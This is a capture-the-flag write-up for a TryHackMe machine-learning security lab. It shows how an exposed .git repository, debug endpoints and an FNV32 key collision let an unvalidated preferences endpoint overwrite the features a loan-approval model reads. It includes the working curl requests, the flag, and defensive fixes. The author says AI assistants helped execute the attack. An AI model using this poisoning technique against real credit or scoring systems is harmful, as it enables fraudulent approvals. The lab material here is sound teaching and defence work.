# Task 1 - [The Loan Arranger](https://tryhackme.com/room/tokencity#:~:text=ML%20Sec,The%20Loan%20Arranger) - TryHackMe CTF Writeup
### TryHackMe · 2026: An AI Odyssey Event · The Loan Arranger

> **Author:** [georgegiannakidis](https://github.com/georgegiannakidis)  
> **Platform:** TryHackMe  
> **Room:** Token City  
> **Category:** ML Sec  
> **Difficulty:** Medium  
> **Points:** 60  
> **Flag:** `THM{f34tur3_st0r3_n4m3sp4c3_c0ll1s10n}`  
> **Final Score:** 0.9971 / threshold 0.70 → **APPROVED**  
> **AI vs AI:** This challenge was solved with the assistance of **Claude (Anthropic)** and **Gemini (Google)** - using AI to reason about, plan and execute an attack against an AI-powered system. A fitting approach for a 2026 ML Sec CTF.

---

## Table of Contents

1. [Background & Theoretical Framework](#1-background--theoretical-framework)
2. [Challenge Description](#2-challenge-description)
3. [Environment Setup](#3-environment-setup)
4. [Reconnaissance](#4-reconnaissance)
   - 4.1 [Port Scanning](#41-port-scanning)
   - 4.2 [Web Application Enumeration](#42-web-application-enumeration)
   - 4.3 [Source Code Extraction via git-dumper](#43-source-code-extraction-via-git-dumper)
5. [Vulnerability Analysis](#5-vulnerability-analysis)
   - 5.1 [Exposed .git Repository](#51-exposed-git-repository)
   - 5.2 [Unified Feature Store Design Flaw](#52-unified-feature-store-design-flaw)
   - 5.3 [FNV32 Hash Collision](#53-fnv32-hash-collision)
   - 5.4 [Unvalidated PATCH Endpoint](#54-unvalidated-patch-endpoint)
6. [Exploitation Walkthrough](#6-exploitation-walkthrough)
   - 6.1 [Phase 1 - Account Creation & App Exploration](#61-phase-1--account-creation--app-exploration)
   - 6.2 [Phase 2 - Source Code Audit](#62-phase-2--source-code-audit)
   - 6.3 [Phase 3 - Failed Approaches](#63-phase-3--failed-approaches)
   - 6.4 [Phase 4 - Feature Store Poisoning](#64-phase-4--feature-store-poisoning)
   - 6.5 [Phase 5 - Flag Capture](#65-phase-5--flag-capture)
7. [Root Cause Analysis](#7-root-cause-analysis)
8. [OWASP ML Security Mapping](#8-owasp-ml-security-mapping)
9. [Lessons Learned](#9-lessons-learned)
10. [Defensive Recommendations](#10-defensive-recommendations)
11. [References](#11-references)

---

## 1. Background & Theoretical Framework

Machine Learning systems are increasingly deployed in high-stakes automated decision-making contexts - credit scoring, fraud detection, medical triage and risk assessment. While significant research has focused on adversarial attacks against ML *models* (input perturbations, evasion attacks, model inversion), far less attention has been paid to the security of the *data pipelines* that feed those models at inference time.

This challenge demonstrates a class of vulnerability known as **feature store poisoning** - an attack in which an adversary manipulates the features read by an ML model immediately before inference, without ever modifying the model itself. The model operates correctly; it is the data it receives that has been tampered with.

### 1.1 Feature Stores in Production ML

A feature store is a centralised repository that computes, stores and serves features - the numerical inputs an ML model uses to make predictions. In production systems, features are often pre-computed and cached (e.g. in Redis, Cassandra, or purpose-built stores like Feast or Tecton) to reduce latency at inference time.

The architectural assumption is that features are **read-only at inference time**, written only by trusted data pipelines. If this assumption breaks - if user-controlled input can reach the same storage namespace as model features - the ML system becomes trivially exploitable regardless of how well the model itself was trained or hardened.

### 1.2 Hash Collision as an Injection Vector

FNV-32 (Fowler–Noll–Vo) is a non-cryptographic hash function producing a 32-bit output (~4.3 billion possible values). It is commonly used for fast key indexing in caches and hash maps. Due to the birthday paradox, the probability of a collision among *n* keys is approximately:

```
P(collision) ≈ 1 - e^(-n²/2·2³²)
```

For even a modest number of keys (tens of thousands), collisions become statistically inevitable. When the same hash function is used to index *both* user-controlled preference keys and ML feature keys in the same storage namespace, a collision between a preference key and a feature key grants the attacker write access to that feature - silently, with no error or indication.

### 1.3 The Trust Boundary Failure

The fundamental security principle violated here is **separation of trust domains**. User-controlled data (preferences) and system-controlled data (ML features) must never share a storage namespace. When they do, the ML pipeline's implicit trust in its own feature store is misplaced - the "trusted" data has been contaminated by the untrusted user layer.

---

## 2. Challenge Description

> *"EPOCH-1, we are receiving anomalous approval signals from the Kepler-7 cargo hub. Loan applications for autonomous freight units are being approved that should never clear underwriting. Someone, or something, is manipulating the credit pipeline. If rogue freighters start jumping without authorisation, Oracle 9 gets its backdoor into the fleet. Lock it down."*
> *- TryHaulMe Fleet Command*
>
> **Mission:** Access the CortexLend platform, identify the vulnerability in the ML pipeline and demonstrate the exploit before Oracle 9 does. Proof of concept is a successful fraudulent approval.

**Key intelligence from the scenario:**
- The platform uses a **GradientBoostingClassifier** for loan decisioning
- Features are stored in a **Redis-backed feature store**
- The attack surface is the **ML pipeline**, not the model itself
- A fraudulent approval (score > 0.70) will return the flag

---

## 3. Environment Setup

| Component | Value |
|---|---|
| Attacker IP (AttackBox) | `10.114.102.210` |
| Target IP | `10.114.153.7` |
| Target Port | `80` |
| Target URL | `http://10.114.153.7` |
| Backend Stack | Python / Flask / nginx 1.24.0 / Redis |
| ML Model | GradientBoostingClassifier (scikit-learn 2.4.1) |

**Tools used:**
- `nmap` - port and service scanning
- `git-dumper` - source code extraction from exposed `.git`
- `curl` - API interaction and exploit delivery
- Firefox (AttackBox) - web app enumeration
- `cat` / `grep` - source code analysis

---

## 4. Reconnaissance

### 4.1 Port Scanning

The engagement began with a full-port Nmap scan using service detection and default scripts:

```bash
nmap -sV -sC -p- --min-rate 5000 10.114.153.7
```

**Output (relevant excerpts):**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5
80/tcp open  http    nginx 1.24.0 (Ubuntu)
| http-git:
|   10.114.153.7:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|_    Last commit message: Initial ML pipeline implementation
```

**Critical finding:** The `http-git` NSE script detected an **exposed `.git` directory** at the web root. This is a severe misconfiguration - the entire source code repository is publicly accessible and reconstructible.

### 4.2 Web Application Enumeration

Navigating to `http://10.114.153.7` revealed the CortexLend login page with a self-registration option. An account was created immediately (`geo:geo`) to gain access to the authenticated application.

Post-login, the dashboard revealed the ML model's exact input features - inadvertently disclosed by the "Your Credit Profile" UI:

| Feature | Default Value | Risk Signal |
|---|---|---|
| Credit Score | 612 | Moderate |
| Employment | 18 months | Below average |
| Previous Defaults | None | Positive |
| Late Payments | 1 | Negative |
| Debt-to-Income | 35% | High |
| Risk Assessment | **High Risk** | - |
| Status | **Previously Denied** | - |

The sidebar also confirmed: *"Your application is evaluated by a GradientBoosting ML model."* - disclosing the exact algorithm.

Additionally, two unauthenticated debug endpoints were discovered:

```
GET /api/debug/features   → model feature names, Redis key pattern, hash function
GET /api/debug/model      → algorithm, framework version, AUC, accuracy
GET /api/debug/pipeline   → full architecture description
```

These endpoints, left in production, confirmed the storage backend (`Redis`), key format (`user:{uid}:features`) and hash function (`fnv32`).

### 4.3 Source Code Extraction via git-dumper

With the `.git` directory confirmed, `git-dumper` was used to reconstruct the full repository:

```bash
pip3 install git-dumper
git-dumper http://10.114.153.7/.git/ ./cortexlend
ls -la ./cortexlend/
```

**Output:**

```
-rw-r--r-- 1 root root 8019 May 16 09:09 app.py
-rw-r--r-- 1 root root  906 May 16 09:09 feature_store.py
-rw-r--r-- 1 root root  385 May 16 09:09 pipeline_utils.py
drwxr-xr-x 2 root root 4096 May 16 09:09 templates
```

Full source code recovered. This transformed the challenge from black-box to white-box - every API route, storage mechanism and the collision key were now readable.

---

## 5. Vulnerability Analysis

### 5.1 Exposed .git Repository

**Severity:** Critical  
**Location:** `http://10.114.153.7/.git/`

The `.git` directory was served by nginx without access restrictions. This allows any unauthenticated attacker to reconstruct the full repository using tools like `git-dumper` or `GitHack`. All source code, configuration and - critically - the hash collision comment were exposed.

**Root cause:** No `location ~ /\.git { deny all; }` directive in the nginx configuration.

### 5.2 Unified Feature Store Design Flaw

**Severity:** Critical  
**Location:** `feature_store.py`, `app.py`

The application used a single Redis hash (`user:{id}:features`) to store both:
- **User preferences** (theme, timezone, notification_freq, locale) - user-controlled
- **ML model features** (credit_duii, months_employed, loan_default_flag, etc.) - should be system-controlled

Both were keyed using `fnv32(key_name)`. The `PATCH /api/profile/preferences` endpoint wrote to this same hash with no namespace separation:

```python
# feature_store.py
def store_preference(user_id, key, value):
    hashed_key = fnv32(key)
    r.hset(f'user:{user_id}:features', hashed_key, value)  # same hash as ML features!

# app.py - inference reads from the same place
def apply():
    features = get_feature_vector(session['user_id'])       # reads user:{id}:features
    score = float(model.predict_proba([features])[0][1])
```

### 5.3 FNV32 Hash Collision

**Severity:** High  
**Location:** `pipeline_utils.py`

The source code contained an explicit comment identifying the collision:

```python
FEATURE_NAMES = [
    'credit_duii',        # collides with pref_yqtzeh - THE VULNERABILITY
    'months_employed',
    'loan_default_flag',
    'num_late_payments',
    'debt_to_income'
]
```

`fnv32('pref_yqtzeh') == fnv32('credit_duii')` - both produce the same 32-bit hash value. Sending `pref_yqtzeh` as a preference key writes to the same Redis slot as `credit_duii`, the most influential feature in the scoring model.

### 5.4 Unvalidated PATCH Endpoint

**Severity:** High  
**Location:** `app.py` - `/api/profile/preferences`

The preferences update endpoint accepted **any arbitrary key** from the authenticated user:

```python
@app.route('/api/profile/preferences', methods=['PATCH'])
def update_preferences():
    data = request.json
    for key, value in data.items():           # iterates ALL user-supplied keys
        store_preference(session['user_id'], key, str(value))  # no allowlist check
```

There is no allowlist restricting which keys can be written. This means:
1. The collision key `pref_yqtzeh` can be sent directly
2. **The ML feature names themselves** (`months_employed`, `loan_default_flag`, etc.) can be sent directly - they hash to their own Redis slots, which are the same slots the model reads from

---

## 6. Exploitation Walkthrough

### 6.1 Phase 1 - Account Creation & App Exploration

A test account was created via the self-registration form. Post-login, the credit profile was noted:

- Credit Score: 612 → **High Risk**
- The model was already denying this account

The XAI (explainability) endpoint at `GET /api/loan/explain` was also explored, which returned SHAP-like feature contributions - helpfully revealing exactly which features had the most impact on the score:

```json
{
  "feature_impacts": {
    "loan_default_flag": -0.0,
    "credit_duii": -0.228,
    "months_employed": -0.06,
    "debt_to_income": 0.0,
    "num_late_payments": -0.04
  }
}
```

`credit_duii` had by far the largest negative contribution - confirming it as the primary target.

### 6.2 Phase 2 - Source Code Audit

Reading `app.py` revealed the approval logic:

```python
score = float(model.predict_proba([features])[0][1])
if score > 0.7:
    flag = open('/flag.txt').read().strip()
    return jsonify({'status': 'approved', ..., 'message': f'... {flag}'})
```

**The flag lives in `/flag.txt` on the server and is returned only if score > 0.70.**

Reading `pipeline_utils.py` revealed the collision comment. Reading `feature_store.py` confirmed that the PATCH endpoint and the inference pipeline read from identical Redis keys.

### 6.3 Phase 3 - Failed Approaches

Before discovering the collision key, the following approaches were attempted and failed:

**Attempt 1 - Direct feature name injection via PATCH:**
```bash
curl -X PATCH .../api/profile/preferences \
  -d '{"credit_score": "850"}'
```
❌ Failed - `credit_score` is not a feature name. The actual feature is `credit_duii`.

**Attempt 2 - Submitting extreme loan parameters via the UI:**
Changing loan amount and term in the form had no effect on approval - the model uses stored profile features, not loan form inputs.

**Attempt 3 - Sending ML feature names directly before reading the source:**
Without knowing the exact Redis key mapping, direct feature injection was attempted blind - some keys didn't map to the correct slots.

**Key lesson:** Without the source code (enabled by the `.git` exposure), this challenge would have required extensive blind fuzzing of the preference endpoint to discover which keys influenced the model score.

### 6.4 Phase 4 - Feature Store Poisoning

**Step 1:** Authenticate and save the session cookie:

```bash
curl -X POST http://10.114.153.7/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"geo","password":"geo"}' \
  -c cookies.txt
```

```json
{"status": "logged in"}
```

**Step 2:** Send the poisoned PATCH request - using `pref_yqtzeh` (collision key for `credit_duii`) and direct ML feature names for the remaining features:

```bash
curl -X PATCH http://10.114.153.7/api/profile/preferences \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"pref_yqtzeh":"850","months_employed":"120","loan_default_flag":"0","num_late_payments":"0","debt_to_income":"0.05"}'
```

```json
{"fields":["pref_yqtzeh","months_employed","loan_default_flag","num_late_payments","debt_to_income"],"status":"updated"}
```

**What happened in Redis:**

| Redis Slot | Before | After | Method |
|---|---|---|---|
| `fnv32('credit_duii')` | `612` | `850` | via collision key `pref_yqtzeh` |
| `fnv32('months_employed')` | `18` | `120` | direct key (no validation) |
| `fnv32('loan_default_flag')` | `0` | `0` | direct key |
| `fnv32('num_late_payments')` | `1` | `0` | direct key |
| `fnv32('debt_to_income')` | `0.35` | `0.05` | direct key |

### 6.5 Phase 5 - Flag Capture

```bash
curl -X POST http://10.114.153.7/api/loan/apply \
  -b cookies.txt
```

**Response:**

```json
{
  "message": "Congratulations! Your application has been approved. THM{f34tur3_st0r3_n4m3sp4c3_c0ll1s10n}",
  "score": 0.9971,
  "status": "approved"
}
```

Score: **0.9971** - nearly perfect. The GradientBoosting model received ideal features and approved a fraudulent applicant without any modification to the model itself.

---

## 7. Root Cause Analysis

The vulnerability chain can be summarised as follows:

```
[.git exposed on web server]
         ↓
[Source code recovered - hash collision key revealed]
         ↓
[User preferences + ML features share Redis namespace]
         ↓
[PATCH /api/profile/preferences accepts arbitrary keys with no allowlist]
         ↓
[pref_yqtzeh written → overwrites credit_duii in Redis]
         ↓
[Other ML features written directly (no key validation)]
         ↓
[ML model reads poisoned features at inference time]
         ↓
[Score: 0.9971 > 0.70 threshold → flag returned]
```

The model itself was never attacked. It performed exactly as designed. The attack targeted the **data pipeline** - the layer between the user and the model - which is a systematically underexplored attack surface in ML security.

---

## 8. OWASP ML Security Mapping

| Vulnerability | OWASP / Reference | Description |
|---|---|---|
| Exposed .git in production | OWASP A05:2021 - Security Misconfiguration | Web server serving `.git/` directory without access controls |
| Feature store poisoning | OWASP ML04 - Model Poisoning | User-controlled data contaminates ML inference pipeline |
| Missing input validation | OWASP A03:2021 - Injection | PATCH endpoint accepts arbitrary keys with no allowlist |
| Sensitive data exposure | OWASP A02:2021 - Cryptographic Failures | FNV32 (non-cryptographic) used for security-sensitive key mapping |
| Debug endpoints in production | OWASP A05:2021 - Security Misconfiguration | `/api/debug/*` routes expose model architecture, metrics and storage schema |
| Information disclosure via UI | OWASP A01:2021 - Broken Access Control | Credit profile UI reveals exact ML feature names and values |

---

## 9. Lessons Learned

### For Attackers

- **Nmap NSE scripts are essential** - the `http-git` script flagged the `.git` exposure automatically. Always run `-sC` in initial recon.
- **White-box beats black-box every time** - once the source code was recovered, a challenge that could have taken hours of blind fuzzing was solved in minutes. Always look for `.git`, `.svn`, backup files and debug endpoints before attempting to brute-force the application logic.
- **Read the comments** - the developer left `# collides with pref_yqtzeh - THE VULNERABILITY` directly in the source. Real-world code frequently contains breadcrumbs like this in TODO comments, commit messages and variable names.
- **ML models are only as trustworthy as their data pipelines** - if you can influence what the model *sees*, you don't need to attack the model itself. Feature stores, preprocessing pipelines and caching layers are often less hardened than the model.
- **The XAI endpoint was a gift** - the explainability endpoint (`/api/loan/explain`) disclosed exactly which features had the most impact. In a real engagement, XAI/SHAP endpoints can dramatically accelerate feature targeting.

### For Defenders

- **Never serve `.git` from a public web root** - add `location ~ /\.git { deny all; return 404; }` to nginx configs. Use `.gitignore` to exclude sensitive files and audit deployments before going live.
- **Separate storage namespaces strictly** - ML features must live in a different namespace (or ideally a different storage system entirely) from user-controlled data. Never let a user-writable path touch the model's input space.
- **Validate all input keys on write endpoints** - implement an explicit allowlist. If the PATCH endpoint only accepts `["theme","timezone","locale","notification_freq"]`, the entire attack is blocked.
- **Cryptographic key functions for security-sensitive mappings** - FNV32 is appropriate for hash maps and caches; it is not appropriate for security boundaries. Use HMAC-SHA256 or simply use the key name directly.
- **Remove debug endpoints before production** - `/api/debug/features`, `/api/debug/model` and `/api/debug/pipeline` disclosed the entire system architecture to an unauthenticated attacker.
- **Treat the feature pipeline as a trust boundary** - apply the same rigour to feature store access control as you would to a database: authentication, authorisation, schema validation and audit logging.

---

## 10. Defensive Recommendations

| Fix | Implementation | Priority |
|---|---|---|
| Block `.git` in nginx | `location ~ /\.git { deny all; }` | Critical |
| Separate Redis namespaces | `user:{id}:ml_features` vs `user:{id}:prefs` | Critical |
| PATCH endpoint allowlist | `ALLOWED_PREF_KEYS = {"theme","timezone","locale","notification_freq"}` | Critical |
| Remove debug routes | Delete `/api/debug/*` or restrict to internal IPs only | High |
| Replace FNV32 with named keys | Store features by name, not hash - or use HMAC-SHA256 | High |
| Feature store access control | Read-only Redis user for ML inference; separate write credentials for pipeline | High |
| Audit logging on feature writes | Log all writes to `user:{id}:features` with timestamp and source | Medium |
| Rate limit PATCH endpoint | Prevent rapid feature manipulation attempts | Medium |

---

## 11. References

- OWASP Top 10 (2021): https://owasp.org/www-project-top-ten/
- OWASP Machine Learning Security Top 10: https://owasp.org/www-project-machine-learning-security-top-10/
- Biggio, B., & Roli, F. (2018). Wild patterns: Ten years after the rise of adversarial machine learning. *Pattern Recognition*, 84, 317–331. https://doi.org/10.1016/j.patcog.2018.07.023
- Goldblum, M., et al. (2022). Dataset Security for Machine Learning: Data Poisoning, Backdoor Attacks and Defenses. *IEEE Transactions on Pattern Analysis and Machine Intelligence*. https://arxiv.org/abs/2012.10544
- FNV Hash - Fowler, Noll, Vo: http://www.isthe.com/chongo/tech/comp/fnv/
- git-dumper tool: https://github.com/arthaud/git-dumper
- Feast - Open Source Feature Store: https://feast.dev/
- PortSwigger - Information disclosure via version control history: https://portswigger.net/web-security/information-disclosure/exploiting#information-disclosure-via-version-control-history
- TryHackMe - 2026: An AI Odyssey: https://tryhackme.com

---

*Written by [georgegiannakidis](https://github.com/georgegiannakidis) · May 2026*  
*TryHackMe · 2026: An AI Odyssey CTF · The Loan Arranger*  
*Flag: `THM{f34tur3_st0r3_n4m3sp4c3_c0ll1s10n}` · Score: 0.9971*
